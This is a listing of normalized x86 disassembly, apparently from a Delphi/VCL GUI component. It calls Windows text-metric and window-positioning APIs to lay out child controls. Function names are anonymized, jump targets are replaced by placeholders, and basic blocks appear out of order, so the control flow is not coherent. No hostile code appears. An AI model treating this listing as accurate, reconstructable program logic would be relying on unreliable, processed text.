pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_435b8c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_428f0e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428f34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_44394c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_40348c
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_428f74
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443794
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_40348c
pop edx
pop esi
pop ebx
retn
sub_428fa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_433e90
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_429250
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_429030
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4292c4
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403290
mov eax [ esi + 0x210 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44668c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_429080
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41c73c
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_429209
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_444968
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43e06c
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43db50
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
sub_429218
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413ad0
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43dd58
mov eax ebx
mov si 0xffeb
call sub_40348c
sub_429250
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_4293c8
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_4292c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428de8
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413b5c
call sub_403290
pop edi
pop esi
pop ebx
retn
sub_429304
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_429080
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42933c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413a74
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413a74
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_4293c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_429491
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_4292c4
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_429080
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429498
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413a74
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413a74
pop edx
call sub_43e17c
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_4294a0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443e54
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413a74
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_429514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
mov esi [ ebp + 0x1c ]
mov eax 0x48
call sub_4026bc
mov [ eax ] edi
mov edx [ ebp + 0xc ]
push esi
mov esi edx
lea edi [ eax + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov dl [ ebp - 0x1 ]
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] bl
mov edx [ esi ]
mov [ eax + 0x16 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1a ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x24 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x38 ] bl
mov edx [ esi ]
mov [ eax + 0x39 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x34 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
sub_429594
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov edx ebx
mov eax edi
call sub_413bb8
mov ebx [ ebx + 0x34 ]
mov eax esi
call sub_4026dc
test ebx ebx
jne r-xdata
sub_4295d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446630
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x64
mov eax ebx
call sub_43d908
mov edx 0x32
mov eax ebx
call sub_43d92c
mov [ ebx + 0x211 ] 0x1
mov [ ebx + 0x212 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f56c
mov esi eax
mov [ ebx + 0x22c ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42b6f0
mov [ ebx + 0x230 ] 0x1a
mov [ ebx + 0x234 ] 0x1
mov dl 0x1
mov eax ebx
call sub_4456f0
mov [ ebx + 0x1f8 ] 0x1
mov dl 0x1
mov eax ebx
call sub_443544
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4296a0
push ebx
push esi
push edi
push ebp
call sub_40361c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x228 ]
call sub_403290
mov eax [ ebp + 0x22c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_44668c
test bl bl
jle r-xdata
inc edi
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403604
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_413a74
call sub_4026dc
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_413a74
test eax eax
je r-xdata
sub_429728
push ebp
mov ebp esp
push ebx
push esi
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
mov ebx [ edx ]
mov esi [ eax + 0x30 ]
cmp ebx [ esi + 0x39 ]
jne r-xdata
mov eax [ eax + 0x30 ]
cmp ecx [ esi + 0x44 ]
je r-xdata
mov ebx [ edx ]
mov [ eax + 0x39 ] ebx
mov [ eax + 0x44 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ ebx - 0x4 ] eax
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_429764
push ebp
mov ebp esp
add esp 0xffffff50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42a295
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42a304
mov [ ebp - 0x55 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
call sub_403ac8
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
mov [ ebp - 0x6c ] 0x2
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
mov [ ebp - 0x6d ] 0x1
dec [ ebp - 0x6c ]
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
inc [ ebp - 0x4c ]
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x48 ] 0x1
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jg r-xdata
call sub_403ac8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov ebx eax
mov al [ ebx + 0x15 ]
mov [ ebx + 0x38 ] al
cmp [ ebx + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x56 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
dec edx
sub edx eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffee
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov ebx eax
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x84 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x84 ]
add eax 0x4
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x84 ]
mov eax [ eax + 0x3d ]
add eax [ ebx + 0x24 ]
mov edx [ ebp - 0x88 ]
sub eax [ edx + 0xc ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x84 ]
mov ecx [ eax + 0x39 ]
mov eax [ ebp - 0x84 ]
add ecx [ eax + 0x44 ]
mov eax [ ebp - 0x88 ]
sub ecx [ eax + 0x8 ]
mov eax [ ebp - 0x88 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x84 ]
add edx [ eax + 0x3d ]
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
mov ebx [ ebp - 0x84 ]
add eax [ ebx + 0x39 ]
call sub_412640
mov eax [ ebp - 0x84 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x98 ]
jne r-xdata
mov eax [ esi + 0x24 ]
add [ ebp - 0x8c ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x41 ] 0x0
cmp [ ebp - 0x41 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov [ ebp - 0x56 ] 0x1
lea edx [ ebp - 0x98 ]
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
call sub_43db0c
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x94 ]
jne r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x1a ] eax
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x3d ] eax
jmp r-xdata
mov [ ebp - 0x41 ] 0x0
mov edx [ ebp - 0x14 ]
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
call sub_413a74
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x98 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x94 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x4c ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x16 ]
mov [ ebx + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ ebx + 0x1a ] edx
mov edx [ eax + 0x39 ]
mov [ ebx + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ ebx + 0x3d ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x1a ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x3d ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov eax [ eax + 0x44 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412668
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
sub [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebx + 0x28 ]
push eax
lea ecx [ ebx + 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0x68 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x54 ]
jge r-xdata
mov [ ebp - 0x78 ] ebx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x16 ] edx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x1a ] edx
mov eax ebx
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x39 ] edx
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp - 0xa0 ]
sub edx [ ebp - 0xa8 ]
mov [ eax + 0x44 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebx + 0x3d ]
mov [ ebp - 0x38 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_412668
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412668
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x54 ]
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0xa8 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x54 ]
call sub_413a74
mov ebx eax
xor eax eax
mov [ ebx + 0x39 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x38 ] 0x1
inc [ ebp - 0x4c ]
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429728
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x44 ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x28 ]
sub [ ebx + 0x39 ] eax
